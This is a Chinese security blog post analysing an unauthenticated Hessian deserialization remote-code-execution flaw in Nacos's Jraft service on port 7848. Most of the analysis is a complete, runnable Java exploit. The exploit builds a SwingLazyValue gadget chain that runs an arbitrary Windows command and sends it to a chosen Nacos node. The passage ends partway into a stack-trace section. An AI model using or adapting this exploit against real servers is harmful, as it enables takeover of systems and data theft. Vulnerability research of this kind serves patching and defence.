---
title: Nacos Hessian 反序列化 RCE
url: https://govuln.com/news/url/q0qo
source: Sec-News 安全文摘
date: 2023-06-09
fetch_date: 2025-10-04T11:45:47.488116
---

# Nacos Hessian 反序列化 RCE

[Y4er的博客](/ "Y4er的博客")

[归档](/posts/) [专栏](/series/) [分类](/categories/) [标签](/tags/) [笔记](/note/) [朋友](/friends/) [作品](/showcase/)

浅色深色跟随系统

[Y4er的博客](/ "Y4er的博客")

取消

[归档](/posts/)[专栏](/series/)[分类](/categories/)[标签](/tags/)[笔记](/note/)[朋友](/friends/)[作品](/showcase/)

浅色深色跟随系统

## 目录

* [漏洞概述](#漏洞概述)
* [影响版本](#影响版本)
* [分析](#分析)
* [gadget构造](#gadget构造)
* [坑点](#坑点)
* [参考](#参考)

## 目录

* [漏洞概述](#漏洞概述)
* [影响版本](#影响版本)
* [分析](#分析)
* [gadget构造](#gadget构造)
* [坑点](#坑点)
* [参考](#参考)

# Nacos Hessian 反序列化 RCE

![Y4er avatar](/img/avatar.jpg)[Y4er](https://github.com/Y4er "Author")
 收录于  类别 [代码审计](/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

2023-06-08  2023-06-08  约 1444 字
 预计阅读 7 分钟

目录

* [漏洞概述](#漏洞概述)
* [影响版本](#影响版本)
* [分析](#分析)
* [gadget构造](#gadget构造)
* [坑点](#坑点)
* [参考](#参考)

警告

本文最后更新于 2023-06-08，文中内容可能已过时。

# # 漏洞概述

由于7848端口采用hessian协议传输数据，反序列化未设置白名单导致存在RCE漏洞。

# # 影响版本

Nacos 1.x在单机模式下默认不开放7848端口，故该情况通常不受此漏洞影响，但是集群模式受影响。然而，2.x版本无论单机或集群模式均默认开放7848端口。

主要受影响的是7848端口的Jraft服务。

# # 分析

以nacos2.2.2为例，单机模式下启动

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/8a5755a6-e501-bf96-1eb7-52f24fb39b3e.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/8a5755a6-e501-bf96-1eb7-52f24fb39b3e.png "image.png")

image.png

本地监听7848端口

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/70da351d-18ff-7f6c-c373-9354f37cf49f.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/70da351d-18ff-7f6c-c373-9354f37cf49f.png "image.png")

image.png

补丁 <https://github.com/alibaba/nacos/pull/10542/files>

能看出来是hessian的锅，看一下在哪用的hessian

`com.alibaba.nacos.consistency.SerializeFactory#getDefault` 序列化工厂类

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ae484e5b-7c2e-5252-0f44-acce322e6844.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ae484e5b-7c2e-5252-0f44-acce322e6844.png "image.png")

image.png

默认用的就是hessian，没啥可分析的。

重点在怎么构造请求包和gadget，根据[《JRaft 用户指南》](https://www.sofastack.tech/projects/sofa-jraft/jraft-user-guide/) 可知以下代码

java

```
package org.example;

import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.google.protobuf.ByteString;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;

public class Main {

    public static void send(String addr, byte[] payload) throws Exception {
        Configuration conf = new Configuration();
        conf.parse(addr);
        RouteTable.getInstance().updateConfiguration("nacos", conf);
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
        PeerId leader = PeerId.parsePeer(addr);
        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClasses.setAccessible(true);
        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
        map.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());
        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_persistent_service_v2").setData(ByteString.copyFrom(payload)).build();
        Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);
    }

    private static byte[] build(String cmd) throws Exception {
        String[] command = {"cmd", "/c", cmd};
        Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = Runtime.class.getMethod("exec", String[].class);
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{command}}});
//        Object value = swingLazyValue.createValue(new UIDefaults());

//        Method getClassFactoryMethod = SerializerFactory.class.getDeclaredMethod("getClassFactory");
//        SwingLazyValue swingLazyValue1 = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{getClassFactoryMethod, SerializerFactory.createDefault(), new Object[]{}}});
//        Object value = swingLazyValue1.createValue(new UIDefaults());
//
//        Method allowMethod = ClassFactory.class.getDeclaredMethod("allow", String.class);
//        SwingLazyValue swingLazyValue2 = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{allowMethod, value, new Object[]{"*"}}});
//        Object value1 = swingLazyValue2.createValue(new UIDefaults());
//        System.out.println(value1);

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("key", swingLazyValue);
        u2.put("key", swingLazyValue);
        HashMap hashMap = new HashMap();
        Class node = Class.forName("java.util.HashMap$Node");
        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        constructor.setAccessible(true);
        Object node1 = constructor.newInstance(0, u1, null, null);
        Object node2 = constructor.newInstance(0, u2, null, null);
        Field key = node.getDeclaredField("key");
        key.setAccessible(true);
        key.set(node1, u1);
        key.set(node2, u2);
        Field size = HashMap.class.getDeclaredField("size");
        size.setAccessible(true);
        size.set(hashMap, 2);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        Object arr = Array.newInstance(node, 2);
        Array.set(arr, 0, node1);
        Array.set(arr, 1, node2);
        table.set(hashMap, arr);

        HashMap hashMap1 = new HashMap();
        size.set(hashMap1, 2);
        table.set(hashMap1, arr);

        HashMap map = new HashMap();
        map.put(hashMap, hashMap);
        map.put(hashMap1, hashMap1);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(map);
        output.flushBuffer();

        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(baos.toByteArray()));
        SerializerFactory.createDefault().getClassFactory().allow("*");
        hessian2Input.readObject();

        return baos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        byte[] bytes = build("calc");
        send("localhost:7848", bytes);
    }
}
```

在`com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply`中判断类型是否是WriteRequest，所以需要处理一下WriteRequest类型，也就是反射的那几行。

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/9491cf87-5c1a-3d71-58e3-7ba86c547968.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/9491cf87-5c1a-3d71-58e3-7ba86c547968.png "image.png")

image.png

触发堆栈如下

text

```
deseiraliz...